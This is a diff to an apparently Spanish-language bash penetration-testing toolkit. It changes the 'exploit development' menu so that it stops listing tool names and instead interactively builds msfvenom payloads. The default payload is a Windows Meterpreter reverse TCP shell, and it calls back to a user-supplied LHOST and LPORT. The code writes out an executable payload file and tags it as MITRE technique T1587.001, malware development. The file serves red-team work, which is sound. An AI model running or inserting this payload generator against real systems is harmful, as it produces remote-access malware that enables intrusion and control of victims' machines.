@@ -1421,13 +1421,35 @@ herramientas_avanzadas() {
                 ;;
             6)
                 echo ""
-                echo -e "${YELLOW}💣 DESARROLLO DE EXPLOITS:${NC}"
+                echo -e "${YELLOW}💣 DESARROLLO DE EXPLOITS — msfvenom${NC}"
                 echo ""
-                echo "• Pattern creation: msf-pattern_create"
-                echo "• Offset calculation: msf-pattern_offset"
-                echo "• Shellcode generation: msfvenom"
-                echo "• Debugging: Immunity Debugger, x64dbg"
-                echo "• Fuzzing: AFL, boofuzz"
+                if check_command msfvenom; then
+                    echo -e "${CYAN}Plataformas: windows, linux, osx, android${NC}"
+                    echo -e "${CYAN}Formatos:    exe, elf, apk, py, ps1, raw, c${NC}"
+                    echo ""
+                    read -p "💣 Payload [windows/meterpreter/reverse_tcp]: " msf_payload
+                    msf_payload="${msf_payload:-windows/meterpreter/reverse_tcp}"
+                    read -p "🖥️  LHOST (tu IP): " msf_lhost
+                    read -p "🔌 LPORT [4444]: " msf_lport
+                    msf_lport="${msf_lport:-4444}"
+                    read -p "📄 Formato [exe]: " msf_format
+                    msf_format="${msf_format:-exe}"
+                    read -p "💾 Nombre del archivo de salida [payload.$msf_format]: " msf_out
+                    msf_out="${msf_out:-payload.$msf_format}"
+                    echo ""
+                    if confirm_risk "msfvenom payload generation" "ALTO" "$msf_lhost:$msf_lport"; then
+                        echo -e "${CYAN}▶ Generando: msfvenom -p $msf_payload LHOST=$msf_lhost LPORT=$msf_lport -f $msf_format -o $msf_out${NC}"
+                        echo ""
+                        local msf_result
+                        msf_result=$(msfvenom -p "$msf_payload" LHOST="$msf_lhost" LPORT="$msf_lport" -f "$msf_format" -o "$msf_out" 2>&1)
+                        echo "$msf_result"
+                        if [ -f "$msf_out" ]; then
+                            echo -e "${GREEN}✅ Payload generado: $msf_out ($(du -h "$msf_out" | cut -f1))${NC}"
+                        fi
+                        save_output "[MSFVENOM $msf_payload LHOST=$msf_lhost LPORT=$msf_lport]\n$msf_result"
+                        type track_technique &>/dev/null && track_technique "T1587.001" "Develop Capabilities: Malware (msfvenom)"
+                    fi
+                fi
                 ;;
             7)
                 return
